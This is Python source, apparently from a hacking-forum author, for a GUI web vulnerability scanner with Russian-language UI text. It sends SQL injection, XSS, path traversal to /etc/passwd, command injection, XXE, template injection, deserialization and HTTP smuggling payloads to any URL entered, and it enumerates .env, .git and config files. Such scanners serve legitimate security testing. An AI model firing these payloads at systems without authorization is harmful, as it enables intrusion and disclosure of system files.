import customtkinter as ctk
import requests
import threading
import json
import re
import ssl
import socket
import time
import base64
import hashlib
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, filedialog

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


class AdvancedSecurityAnalyzer:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.severity_scores = {
            'CRITICAL': 10,
            'HIGH': 8,
            'MEDIUM': 5,
            'LOW': 2,
            'INFO': 1
        }

        # Payloads для различных уязвимостей
        self.lfi_payloads = [
            '../../../../etc/passwd',
            '....//....//....//....//etc/passwd',
            '%2e%2e%2fetc%2fpasswd',
            '..%5c..%5c..%5c..%5c/windows/win.ini'
        ]

        self.rce_payloads = ['; ls', '| dir', '`id`', '$(whoami)']
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>"
        ]
        self.sqli_payloads = [
            "' OR 1=1-- -",
            "' UNION SELECT null,version()-- -",
            "1' ORDER BY 10-- -"
        ]
        self.xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>'''
        self.sti_payloads = {
            'Twig': '{{7*7}}',
            'Jinja2': '{{7*7}}',
            'Smarty': '{7*7}',
            'Velocity': '#set($x=7*7)${x}'
        }
        self.deserialization_payloads = {
            'PHP': 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
            'Java': base64.b64encode(
                b'\xac\xed\x00\x05sr\x00\x0ejava.lang.Long;\x8b\xe4\x90\xcc\x8f#\xdf\x02\x00\x01J\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x00\x00\x00\x00\x01').decode(),
            'Python': b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00}\x94\x8c\x04test\x94\x8c\x04test\x94s.'.decode(
                'latin1')
        }

    def comprehensive_scan(self, url, callback=None):
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'security_score': 0
        }

        try:
            if callback: callback("Анализ базовой информации...", 0.1)
            basic_info = self.analyze_url(url)
            if 'error' in basic_info:
                return basic_info

            results.update(basic_info)

            if callback: callback("Проверка SSL/TLS...", 0.3)
            ssl_info = self.analyze_ssl(url)
            results['ssl_analysis'] = ssl_info

            if callback: callback("Анализ заголовков безопасности...", 0.5)
            security_headers = self.advanced_security_headers_check(basic_info.get('headers', {}))
            results['security_headers'] = security_headers

            if callback: callback("Поиск уязвимостей в формах...", 0.7)
            form_vulns = self.analyze_forms_security(basic_info.get('content', ''), url)
            results['form_vulnerabilities'] = form_vulns

            if callback: callback("Проверка cookies...", 0.8)
            cookie_analysis = self.advanced_cookie_analysis(basic_info.get('cookies', []))
            results['cookie_analysis'] = cookie_analysis

            if callback: callback("Поиск скрытых директорий...", 0.9)
            directory_scan = self.directory_enumeration(url)
            results['directory_scan'] = directory_scan

            if callback: callback("Анализ JavaScript...", 0.95)
            js_analysis = self.analyze_javascript_security(basic_info.get('content', ''))
            results['javascript_analysis'] = js_analysis

            if callback: callback("Проверка на SQL/XSS...", 0.72)
            results['web_vulns'] = self.check_web_vulnerabilities(url, basic_info.get('content', ''))

            if callback: callback("Проверка RCE/LFI...", 0.75)
            results['server_vulns'] = self.check_server_vulnerabilities(url)

            if callback: callback("Проверка CORS/JWT...", 0.78)
            results['api_vulns'] = self.check_api_vulnerabilities(basic_info.get('headers', {}),
                                                                  results.get('cookies', []))

            if callback: callback("Поиск уязвимых библиотек...", 0.82)
            results['outdated_libs'] = self.check_outdated_libraries(basic_info.get('content', ''))

            results['security_score'] = self.calculate_security_score(results)
            results['risk_assessment'] = self.generate_risk_assessment(results)

            if callback: callback("Завершено!", 1.0)

        except Exception as e:
            results['error'] = f"Ошибка при анализе: {str(e)}"

        return results

    def analyze_url(self, url):
        try:
            response = self.session.get(url, timeout=15, allow_redirects=True, verify=False)
            return {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'cookies': response.cookies,
                'content': response.text,
                'final_url': response.url,
                'response_time': response.elapsed.total_seconds()
            }
        except Exception as e:
            return {'error': str(e)}

    def analyze_ssl(self, url):
        try:
            parsed_url = urlparse(url)
            if parsed_url.scheme != 'https':
                return {'error': 'Сайт не использует HTTPS', 'severity': 'HIGH'}

            hostname = parsed_url.hostname
            port = parsed_url.port or 443

            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()

            return {
                'certificate': {
                    'subject': dict(x[0] for x in cert['subject']),
                    'issuer': dict(x[0] for x in cert['issuer']),
                    'expires': cert['notAfter']
                },
                'cipher_suite': {
                    'name': cipher[0],
                    'version': cipher[1],
                    'bits': cipher[2]
                },
                'vulnerabilities': self.check_ssl_vulnerabilities(cipher, cert)
            }
        except Exception as e:
            return {'error': f'Ошибка SSL анализа: {str(e)}', 'severity': 'MEDIUM'}

    def check_ssl_vulnerabilities(self, cipher, cert):
        vulns = []

        weak_ciphers = ['RC4', 'DES', '3DES', 'MD5', 'NULL', 'EXPORT']
        if any(weak in cipher[0] for weak in weak_ciphers):
            vulns.append({
                'type': 'Слабый шифр',
                'description': f'Используется уязвимый шифр: {cipher[0]}',
                'severity': 'HIGH'
            })

        if cipher[2] < 128:
            vulns.append({
                'type': 'Слабое шифрование',
                'description': f'Длина ключа меньше 128 бит: {cipher[2]}',
                'severity': 'MEDIUM'
            })

        # Проверка срока действия сертификата
        expires = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        days_left = (expires - datetime.now()).days
        if days_left < 30:
            vulns.append({
                'type': 'Сертификат истекает',
                'description': f'Срок действия сертификата истекает через {days_left} дней',
                'severity': 'MEDIUM'
            })

        return vulns

    def advanced_security_headers_check(self, headers):
        security_checks = {
            'Strict-Transport-Security': {
                'present': 'Strict-Transport-Security' in headers,
                'severity': 'HIGH',
                'description': 'HSTS защищает от атак понижения протокола',
                'recommendation': 'Добавьте заголовок Strict-Transport-Security с max-age не менее 31536000'
            },
            'Content-Security-Policy': {
                'present': 'Content-Security-Policy' in headers,
                'severity': 'HIGH',
                'description': 'CSP предотвращает XSS атаки',
                'recommendation': 'Настройте Content-Security-Policy с ограниченными источниками'
            },
            'X-Frame-Options': {
                'present': 'X-Frame-Options' in headers,
                'severity': 'MEDIUM',
                'description': 'Защищает от clickjacking атак',
                'recommendation': 'Добавьте X-Frame-Options: DENY или SAMEORIGIN'
            },
            'X-Content-Type-Options': {
                'present': 'X-Content-Type-Options' in headers,
                'severity': 'MEDIUM',
                'description': 'Предотвращает MIME-sniffing атаки',
                'recommendation': 'Добавьте X-Content-Type-Options: nosniff'
            },
            'X-XSS-Protection': {
                'present': 'X-XSS-Protection' in headers,
                'severity': 'MEDIUM',
                'description': 'Защита от отраженных XSS атак',
                'recommendation': 'Добавьте X-XSS-Protection: 1; mode=block'
            },
            'Referrer-Policy': {
                'present': 'Referrer-Policy' in headers,
                'severity': 'LOW',
                'description': 'Контроль передачи Referer заголовка',
                'recommendation': 'Настройте Referrer-Policy: no-referrer-when-downgrade'
            },
            'Permissions-Policy': {
                'present': 'Permissions-Policy' in headers,
                'severity': 'MEDIUM',
                'description': 'Контроль доступа к API браузера',
                'recommendation': 'Настройте Permissions-Policy с ограниченными разрешениями'
            }
        }

        analysis = {}
        for header, check in security_checks.items():
            if check['present']:
                analysis[header] = {
                    'status': 'OK',
                    'value': headers[header]
                }
            else:
                analysis[header] = {
                    'status': 'MISSING',
                    'severity': check['severity'],
                    'description': check['description'],
                    'recommendation': check['recommendation']
                }

        # Дополнительная проверка CORS
        if 'Access-Control-Allow-Origin' in headers:
            cors_value = headers['Access-Control-Allow-Origin']
            if cors_value == '*':
                analysis['CORS'] = {
                    'status': 'VULNERABLE',
                    'value': cors_value,
                    'severity': 'MEDIUM',
                    'description': 'CORS разрешен для всех доменов (*)',
                    'recommendation': 'Ограничьте Access-Control-Allow-Origin конкретными доменами'
                }

        return analysis

    def analyze_forms_security(self, content, base_url):
        soup = BeautifulSoup(content, 'html.parser')
        forms = soup.find_all('form')
        vulnerabilities = []

        for i, form in enumerate(forms):
            form_analysis = {
                'form_id': i + 1,
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'vulnerabilities': []
            }

            if form_analysis['method'] == 'GET':
                form_analysis['vulnerabilities'].append({
                    'type': 'Небезопасный метод',
                    'description': 'Форма использует GET метод для отправки данных',
                    'severity': 'MEDIUM'
                })

            csrf_token = form.find(['input'], {'name': re.compile(r'csrf|token|_token', re.I)})
            if not csrf_token:
                form_analysis['vulnerabilities'].append({
                    'type': 'Отсутствует CSRF защита',
                    'description': 'Форма не содержит CSRF токен',
                    'severity': 'HIGH'
                })

            # Проверка на возможность загрузки файлов
            file_input = form.find('input', {'type': 'file'})
            if file_input:
                form_analysis['vulnerabilities'].append({
                    'type': 'Форма загрузки файлов',
                    'description': 'Обнаружена форма загрузки файлов (возможна уязвимость)',
                    'severity': 'MEDIUM',
                    'recommendation': 'Проверьте ограничения на типы файлов и размеры'
                })

            vulnerabilities.append(form_analysis)

        return vulnerabilities

    def advanced_cookie_analysis(self, cookies):
        cookie_issues = []

        for cookie in cookies:
            issues = []

            if not cookie.secure:
                issues.append({
                    'type': 'Небезопасная передача',
                    'description': 'Cookie не имеет флага Secure',
                    'severity': 'MEDIUM'
                })

            if not cookie.has_nonstandard_attr('HttpOnly'):
                issues.append({
                    'type': 'Доступ из JavaScript',
                    'description': 'Cookie доступен через JavaScript (отсутствует HttpOnly)',
                    'severity': 'MEDIUM'
                })

            if cookie.name.lower().startswith('session') and 'samesite' not in cookie.__dict__:
                issues.append({
                    'type': 'Отсутствует SameSite',
                    'description': 'Session cookie без атрибута SameSite',
                    'severity': 'MEDIUM'
                })

            cookie_issues.append({
                'name': cookie.name,
                'domain': cookie.domain,
                'path': cookie.path,
                'issues': issues
            })

        return cookie_issues

    def directory_enumeration(self, url):
        common_dirs = [
            'admin', 'login', 'wp-admin', 'backup', 'config', 'test',
            '.git', '.env', 'robots.txt', '.htaccess', 'wp-config.php',
            'config.php', 'database.sql', 'dump.sql', 'backup.zip'
        ]

        found_dirs = []
        base_url = url.rstrip('/')

        for directory in common_dirs:
            try:
                test_url = f"{base_url}/{directory}"
                response = self.session.head(test_url, timeout=5, allow_redirects=False)

                if response.status_code in [200, 301, 302, 403]:
                    risk_level = 'HIGH' if directory in ['.git', '.env', 'wp-config.php'] else 'MEDIUM'
                    found_dirs.append({
                        'path': directory,
                        'status_code': response.status_code,
                        'risk_level': risk_level
                    })
            except:
                continue

        return found_dirs

    def analyze_javascript_security(self, content):
        soup = BeautifulSoup(content, 'html.parser')
        js_issues = []

        scripts = soup.find_all('script')
        for script in scripts:
            if script.string:
                js_code = script.string
                if 'eval(' in js_code:
                    js_issues.append({
                        'type': 'Использование eval()',
                        'description': 'Обнаружено использование функции eval()',
                        'severity': 'HIGH',
                        'recommendation': 'Замените eval() на безопасные альтернативы'
                    })
                if 'innerHTML' in js_code:
                    js_issues.append({
                        'type': 'Небезопасное использование innerHTML',
                        'description': 'Использование innerHTML может привести к XSS',
                        'severity': 'MEDIUM',
                        'recommendation': 'Используйте textContent вместо innerHTML'
                    })
                if 'localStorage' in js_code and 'sensitive' in js_code:
                    js_issues.append({
                        'type': 'Хранение чувствительных данных',
                        'description': 'Чувствительные данные хранятся в localStorage',
                        'severity': 'HIGH',
                        'recommendation': 'Не храните чувствительные данные в localStorage'
                    })

        return js_issues

    def check_web_vulnerabilities(self, url, content):
        vulnerabilities = []

        # Проверка SQLi в параметрах URL
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        for param, values in query_params.items():
            for value in values:
                for payload in self.sqli_payloads:
                    test_url = url.replace(f"{param}={value}", f"{param}={payload}")
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        if "SQL syntax" in response.text or "mysql_fetch" in response.text:
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'param': param,
                                'payload': payload,
                                'severity': 'CRITICAL'
                            })
                    except:
                        continue

        # Проверка отраженного XSS
        for param, values in query_params.items():
            for value in values:
                for payload in self.xss_payloads:
                    test_url = url.replace(f"{param}={value}", f"{param}={payload}")
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        if payload in response.text:
                            vulnerabilities.append({
                                'type': 'Reflected XSS',
                                'param': param,
                                'payload': payload,
                                'severity': 'HIGH'
                            })
                    except:
                        continue

        # Проверка форм на уязвимости загрузки файлов
        soup = BeautifulSoup(content, 'html.parser')
        for form in soup.find_all('form'):
            if form.find('input', {'type': 'file'}):
                vulnerabilities.append({
                    'type': 'File Upload Form',
                    'description': 'Обнаружена форма загрузки файлов',
                    'severity': 'MEDIUM',
                    'recommendation': 'Проверьте ограничения на типы файлов и размеры'
                })

        # Проверка на Server-Side Template Injection (SSTI)
        for param, values in query_params.items():
            for value in values:
                for engine, payload in self.sti_payloads.items():
                    test_url = url.replace(f"{param}={value}", f"{param}={payload}")
                    try:
                        response = self.session.get(test_url, timeout=10, verify=False)
                        if "49" in response.text:
                            vulnerabilities.append({
                                'type': 'Server-Side Template Injection',
                                'engine': engine,
                                'param': param,
                                'payload': payload,
                                'severity': 'HIGH'
                            })
                    except:
                        continue

        return vulnerabilities

    def check_server_vulnerabilities(self, url):
        vulnerabilities = []

        # Проверка LFI/RFI
        for payload in self.lfi_payloads:
            test_url = f"{url}?page={payload}" if '?' in url else f"{url}?param={payload}"
            try:
                response = self.session.get(test_url, timeout=10, verify=False)
                if "root:" in response.text or "daemon:" in response.text or "[extensions]" in response.text:
                    vulnerabilities.append({
                        'type': 'LFI/RFI',
                        'payload': payload,
                        'severity': 'HIGH'
                    })
            except:
                continue

        # Проверка RCE/Command Injection
        for payload in self.rce_payloads:
            test_url = f"{url}?cmd={payload}" if '?' in url else f"{url}?command={payload}"
            try:
                response = self.session.get(test_url, timeout=10, verify=False)
                if "uid=" in response.text or "Volume Serial" in response.text:
                    vulnerabilities.append({
                        'type': 'Command Injection',
                        'payload': payload,
                        'severity': 'CRITICAL'
                    })
            except:
                continue

        # Проверка XXE
        try:
            response = self.session.post(
                url,
                data=self.xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=15,
                verify=False
            )
            if "root:" in response.text:
                vulnerabilities.append({
                    'type': 'XXE Injection',
                    'payload': 'SYSTEM "file:///etc/passwd"',
                    'severity': 'CRITICAL'
                })
        except:
            pass

        # Проверка десериализации
        for lang, payload in self.deserialization_payloads.items():
            try:
                response = self.session.post(
                    url,
                    data={'data': payload},
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=15,
                    verify=False
                )
                if "unserialize()" in response.text or "ObjectInputStream" in response.text:
                    vulnerabilities.append({
                        'type': 'Deserialization',
                        'language': lang,
                        'severity': 'CRITICAL'
                    })
            except:
                pass

        # Проверка HTTP Smuggling (CL.TE)
        try:
            smuggled_request = f"""POST / HTTP/1.1
Host: {urlparse(url).hostname}
Content-Length: 6
Transfer-Encoding: chunked

0

GET /smuggled HTTP/1.1
Host: {urlparse(url).hostname}

""".replace('\n', '\r\n')

            response = self.session.post(
                url,
                data=smuggled_request,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=15,
                verify=False
            )

            if "smuggled" in response.text:
                vulnerabilities.append({
                    'type': 'HTTP Smuggling',
                    'description': 'Обнаружена уязвимость HTTP Smuggling (CL.TE)',
                    'severity': 'HIGH'
                })
        except:
            pass

        # Проверка Buffer Overflow (информационная)
        vulnerabilities.append({
            'type': 'Buffer Overflow',
            'description': 'Проверка переполнения буфера требует специфичных эксплойтов и не может быть безопасно выполнена автоматически',
            'severity': 'INFO'
        })

        return vulnerabilities

    def check_api_vulnerabilities(self, headers, cookies):
        vulnerabilities = []

        # Проверка CORS
        cors_header = headers.get('Access-Control-Allow-Origin', '')
        if cors_header == '*':
            vulnerabilities.append({
                'type': 'CORS Misconfiguration',
                'description': 'Доступ разрешен для всех доменов (*)',
                'severity': 'MEDIUM',
                'recommendation': 'Ограничьте Access-Control-Allow-Origin конкретными доменами'
            })

        # Проверка JWT
        jwt_cookies = [c for c in cookies if c.name.startswith('jwt') or 'token' in c.name]
        for cookie in jwt_cookies:
            if not cookie.secure:
                vulnerabilities.append({
                    'type': 'JWT Security Issue',
                    'description': f'JWT cookie {cookie.name} без флага Secure',
                    'severity': 'MEDIUM'
                })

            # Проверка алгоритма подписи
            if cookie.value and '.' in cookie.value:
                header, payload, signature = cookie.value.split('.')
                try:
                    header_data = json.loads(base64.urlsafe_b64decode(header + '==').decode())
                    if header_data.get('alg') == 'none':
                        vulnerabilities.append({
                            'type': 'JWT Algorithm None',
                            'description': f'JWT cookie {cookie.name} использует алгоритм "none"',
                            'severity': 'HIGH'
                        })
                except:
                    pass

        # Проверка Clickjacking
        if not headers.get('X-Frame-Options') and not headers.get('Content-Security-Policy'):
            vulnerabilities.append({
                'type': 'Clickjacking Vulnerability',
                'description': 'Отсутствует защита от clickjacking',
                'severity': 'MEDIUM',
                'recommendation': 'Добавьте X-Frame-Options или Content-Security-Policy'
            })

        return vulnerabilities

    def check_outdated_libraries(self, content):
        # Проверяем наличие известных библиотек и их версий
        libs = {
            'jquery': {
                'pattern': r'jquery[.-](\d+\.\d+\.\d+)',
                'vulnerable_versions': ['1.2.0', '1.4.0', '3.5.0'],
                'fixed': ['3.5.1']
            },
            'chart.js': {
                'pattern': r'chart\.js[^\d]*(\d+\.\d+\.\d+)',
                'vulnerable_versions': ['2.9.4', '3.7.0'],
                'fixed': ['2.9.5', '3.7.1']
            },
            'bootstrap': {
                'pattern': r'bootstrap[^\d]*(\d+\.\d+\.\d+)',
                'vulnerable_versions': ['4.0.0', '5.0.0'],
                'fixed': ['4.0.1', '5.0.1']
            },
            'angular': {
                'pattern': r'angular\.js[^\d]*(\d+\.\d+\.\d+)',
                'vulnerable_versions': ['1.8.0'],
                'fixed': ['1.8.2']
            },
            'react': {
                'pattern': r'react[^\d]*(\d+\.\d+\.\d+)',
                'vulnerable_versions': ['17.0.1'],
                'fixed': ['17.0.2']
            }
        }

        found_libs = []
        for lib_name, lib_info in libs.items():
            versions = re.findall(lib_info['pattern'], content, re.IGNORECASE)
            for version in versions:
                # Проверяем, является ли версия уязвимой
                if version in lib_info['vulnerable_versions']:
                    found_libs.append({
                        'name': lib_name,
                        'version': version,
                        'status': 'VULNERABLE',
                        'severity': 'HIGH'
                    })
                elif version in lib_info['fixed']:
                    found_libs.append({
                        'name': lib_name,
                        'version': version,
                        'status': 'FIXED',
                        'severity': 'LOW'
                    })
                else:
                    found_libs.append({
                        'name': lib_name,
                        'version': version,
                        'status': 'UNKNOWN',
                        'severity': 'INFO'
                    })

        return found_libs

    def calculate_security_score(self, results):
        total_score = 100

        if 'ssl_analysis' in results and 'vulnerabilities' in results['ssl_analysis']:
            for vuln in results['ssl_analysis']['vulnerabilities']:
                total_score -= self.severity_scores.get(vuln['severity'], 1)

        if 'security_headers' in results:
            for header, info in results['security_headers'].items():
                if info.get('status') in ['MISSING', 'VULNERABLE']:
                    total_score -= self.severity_scores.get(info.get('severity', 'LOW'), 1)

        # Штрафы за найденные уязвимости
        for vuln_type in ['web_vulns', 'server_vulns', 'api_vulns']:
            if vuln_type in results:
                for vuln in results[vuln_type]:
                    total_score -= self.severity_scores.get(vuln.get('severity', 'MEDIUM'), 1)

        # Штрафы за устаревшие библиотеки
        if 'outdated_libs' in results:
            for lib in results['outdated_libs']:
                if lib['status'] == 'VULNERABLE':
                    total_score -= 5

        return max(0, total_score)

    def generate_risk_assessment(self, results):
        score = results.get('security_score', 0)

        if score >= 90:
            return {'level': 'НИЗКИЙ', 'color': 'green', 'description': 'Отличная безопасность'}
        elif score >= 70:
            return {'level': 'СРЕДНИЙ', 'color': 'yellow', 'description': 'Хорошая безопасность'}
        elif score >= 50:
            return {'level': 'ВЫСОКИЙ', 'color': 'orange', 'description': 'Требуются улучшения'}
        else:
            return {'level': 'КРИТИЧЕСКИЙ', 'color': 'red', 'description': 'Серьезные проблемы'}


class PapikScanPro:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title("PapikScan - Lolz: папик")
        self.root.geometry("1400x900")

        self.analyzer = AdvancedSecurityAnalyzer()
        self.current_results = {}

        self.setup_themes()
        self.setup_ui()

    def setup_themes(self):
        self.colors = {
            'primary': '#1f538d',
            'success': '#27ae60',
            'warning': '#f39c12',
            'danger': '#e74c3c',
            'dark': '#2c3e50'
        }

    def setup_ui(self):
        self.root.grid_columnconfigure(1, weight=1)
        self.root.grid_rowconfigure(0, weight=1)

        self.create_sidebar()
        self.create_main_content()
        self.create_status_bar()

    def create_sidebar(self):
        self.sidebar = ctk.CTkFrame(self.root, width=300)
        self.sidebar.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.sidebar.grid_propagate(False)

        logo_label = ctk.CTkLabel(
            self.sidebar,
            text="🛡️ PapikScan - Lolz: папик",
            font=ctk.CTkFont(size=22, weight="bold")
        )
        logo_label.pack(pady=20)

        ctk.CTkLabel(self.sidebar, text="URL для анализа:", font=ctk.CTkFont(weight="bold")).pack(pady=(10, 5))

        self.url_entry = ctk.CTkEntry(
            self.sidebar,
            placeholder_text="https://example.com",
            height=40
        )
        self.url_entry.pack(fill="x", padx=20, pady=5)

        self.scan_button = ctk.CTkButton(
            self.sidebar,
            text="🚀 Запустить сканирование",
            command=self.start_scan,
            height=45,
            font=ctk.CTkFont(size=14, weight="bold")
        )
        self.scan_button.pack(fill="x", padx=20, pady=10)

        self.progress_bar = ctk.CTkProgressBar(self.sidebar)
        self.progress_bar.pack(fill="x", padx=20, pady=5)
        self.progress_bar.set(0)

        self.progress_label = ctk.CTkLabel(self.sidebar, text="Готов к сканированию")
        self.progress_label.pack(pady=5)

        self.export_button = ctk.CTkButton(
            self.sidebar,
            text="📄 Экспорт отчета",
            command=self.export_report,
            height=35
        )
        self.export_button.pack(fill="x", padx=20, pady=(20, 10))

    def create_main_content(self):
        self.main_frame = ctk.CTkFrame(self.root)
        self.main_frame.grid(row=0, column=1, sticky="nsew", padx=(0, 10), pady=10)
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_rowconfigure(1, weight=1)

        self.header_frame = ctk.CTkFrame(self.main_frame, height=120)
        self.header_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
        self.header_frame.grid_propagate(False)
        self.header_frame.grid_columnconfigure((0, 1, 2), weight=1)

        # Карточки статистики
        self.score_frame = ctk.CTkFrame(self.header_frame)
        self.score_frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=10)

        ctk.CTkLabel(self.score_frame, text="Рейтинг безопасности", font=ctk.CTkFont(size=12)).pack(pady=(10, 0))

        self.score_value = ctk.CTkLabel(
            self.score_frame,
            text="--",
            font=ctk.CTkFont(size=36, weight="bold"),
            text_color=self.colors['primary']
        )
        self.score_value.pack()

        self.risk_frame = ctk.CTkFrame(self.header_frame)
        self.risk_frame.grid(row=0, column=1, sticky="nsew", padx=5, pady=10)

        ctk.CTkLabel(self.risk_frame, text="Уровень риска", font=ctk.CTkFont(size=12)).pack(pady=(10, 0))

        self.risk_value = ctk.CTkLabel(
            self.risk_frame,
            text="НЕ ОПРЕДЕЛЕН",
            font=ctk.CTkFont(size=16, weight="bold")
        )
        self.risk_value.pack()

        self.vulns_frame = ctk.CTkFrame(self.header_frame)
        self.vulns_frame.grid(row=0, column=2, sticky="nsew", padx=5, pady=10)

        ctk.CTkLabel(self.vulns_frame, text="Найдено проблем", font=ctk.CTkFont(size=12)).pack(pady=(10, 0))

        self.vulns_value = ctk.CTkLabel(
            self.vulns_frame,
            text="0",
            font=ctk.CTkFont(size=36, weight="bold"),
            text_color=self.colors['danger']
        )
        self.vulns_value.pack()

        # Главная область с вкладками
        self.tabview = ctk.CTkTabview(self.main_frame)
        self.tabview.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)

        self.setup_tabs()

    def setup_tabs(self):
        tabs = [
            ("🎯 Обзор", "overview"),
            ("🔒 SSL/TLS", "ssl"),
            ("📋 Заголовки", "headers"),
            ("📝 Формы", "forms"),
            ("🍪 Cookies", "cookies"),
            ("📁 Директории", "directories"),
            ("⚡ JavaScript", "javascript"),
            ("⚠️ Уязвимости", "vulnerabilities"),
            ("📦 Библиотеки", "libraries"),
            ("📊 Данные", "raw")
        ]

        self.tab_contents = {}

        for tab_name, tab_key in tabs:
            self.tabview.add(tab_name)

            text_widget = ctk.CTkTextbox(
                self.tabview.tab(tab_name),
                font=ctk.CTkFont(family="Consolas", size=11)
            )
            text_widget.pack(fill="both", expand=True, padx=10, pady=10)

            self.tab_contents[tab_key] = text_widget

    def create_status_bar(self):
        self.status_bar = ctk.CTkFrame(self.root, height=30)
        self.status_bar.grid(row=1, column=0, columnspan=2, sticky="ew", padx=10, pady=(0, 10))
        self.status_bar.grid_propagate(False)

        self.status_text = ctk.CTkLabel(
            self.status_bar,
            text="Готов к работе • PapikScan - Lolz: папик",
            font=ctk.CTkFont(size=11)
        )
        self.status_text.pack(side="left", padx=20, pady=5)

    def start_scan(self):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Ошибка", "Введите URL для сканирования")
            return

        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url

        self.scan_button.configure(state="disabled", text="⏳ Сканирование...")
        self.progress_bar.set(0)
        self.clear_results()

        thread = threading.Thread(target=self.perform_scan, args=(url,))
        thread.daemon = True
        thread.start()

    def perform_scan(self, url):
        start_time = time.time()

        try:
            def update_progress(message, progress):
                self.root.after(0, lambda: self.progress_bar.set(progress))
                self.root.after(0, lambda: self.progress_label.configure(text=message))

            results = self.analyzer.comprehensive_scan(url, update_progress)

            if 'error' in results:
                self.root.after(0, lambda: self.show_error(results['error']))
                return

            self.current_results = results
            scan_time = time.time() - start_time

            self.root.after(0, lambda: self.display_results(results, scan_time))

        except Exception as e:
            self.root.after(0, lambda: self.show_error(f"Ошибка: {str(e)}"))

    def display_results(self, results, scan_time):
        # Обновляем карточки
        score = results.get('security_score', 0)
        self.score_value.configure(text=str(score))

        risk_info = results.get('risk_assessment', {})
        risk_level = risk_info.get('level', 'НЕ ОПРЕДЕЛЕН')
        risk_color = risk_info.get('color', 'gray')

        color_map = {
            'green': self.colors['success'],
            'yellow': self.colors['warning'],
            'orange': '#ff8c00',
            'red': self.colors['danger']
        }

        self.risk_value.configure(
            text=risk_level,
            text_color=color_map.get(risk_color, self.colors['dark'])
        )

        # Подсчитываем проблемы
        total_issues = 0
        if 'security_headers' in results:
            total_issues += sum(
                1 for h in results['security_headers'].values() if h.get('status') in ['MISSING', 'VULNERABLE'])
        if 'form_vulnerabilities' in results:
            for form in results['form_vulnerabilities']:
                total_issues += len(form.get('vulnerabilities', []))
        for vuln_type in ['web_vulns', 'server_vulns', 'api_vulns']:
            if vuln_type in results:
                total_issues += len(results[vuln_type])

        self.vulns_value.configure(text=str(total_issues))

        # Заполняем вкладки
        self.populate_overview_tab(results)
        self.populate_ssl_tab(results.get('ssl_analysis', {}))
        self.populate_headers_tab(results.get('security_headers', {}))
        self.populate_forms_tab(results.get('form_vulnerabilities', []))
        self.populate_cookies_tab(results.get('cookie_analysis', []))
        self.populate_directories_tab(results.get('directory_scan', []))
        self.populate_javascript_tab(results.get('javascript_analysis', []))
        self.populate_vulnerabilities_tab(
            results.get('web_vulns', []),
            results.get('server_vulns', []),
            results.get('api_vulns', [])
        )
        self.populate_libraries_tab(results.get('outdated_libs', []))
        self.populate_raw_tab(results)

        # Обновляем статус
        self.scan_button.configure(state="normal", text="🚀 Запустить сканирование")
        self.progress_label.configure(text="Сканирование завершено")
        self.status_text.configure(text=f"Завершено • Проблем: {total_issues} • Время: {scan_time:.2f}с")

    def populate_overview_tab(self, results):
        content = f"""
🎯 СВОДКА ПО БЕЗОПАСНОСТИ
{'=' * 60}

📊 Общая информация:
   • URL: {results.get('url', 'Неизвестно')}
   • Рейтинг безопасности: {results.get('security_score', 0)}/100
   • Код ответа: {results.get('status_code', 'Неизвестно')}
   • Время ответа: {results.get('response_time', 'Неизвестно')}с

🎯 Оценка рисков:
   • Уровень: {results.get('risk_assessment', {}).get('level', 'НЕ ОПРЕДЕЛЕН')}
   • Описание: {results.get('risk_assessment', {}).get('description', 'Нет данных')}

📋 Анализ безопасности:
"""

        if 'ssl_analysis' in results and 'vulnerabilities' in results['ssl_analysis']:
            ssl_issues = len(results['ssl_analysis']['vulnerabilities'])
            content += f"   🔒 SSL/TLS: {ssl_issues} проблем\n"

        if 'security_headers' in results:
            missing = sum(
                1 for h in results['security_headers'].values() if h.get('status') in ['MISSING', 'VULNERABLE'])
            content += f"   📋 Заголовки: {missing} проблем\n"

        for vuln_type in ['web_vulns', 'server_vulns', 'api_vulns']:
            if vuln_type in results:
                vuln_count = len(results[vuln_type])
                if vuln_count > 0:
                    content += f"   ⚠️ {vuln_type.replace('_', ' ').title()}: {vuln_count} проблем\n"

        self.tab_contents['overview'].delete("0.0", "end")
        self.tab_contents['overview'].insert("0.0", content)

    def populate_ssl_tab(self, ssl_data):
        if 'error' in ssl_data:
            content = f"❌ Ошибка SSL: {ssl_data['error']}"
        else:
            content = "🔒 SSL/TLS АНАЛИЗ\n" + "=" * 50 + "\n\n"

            if 'certificate' in ssl_data:
                cert = ssl_data['certificate']
                content += f"📜 Сертификат:\n"
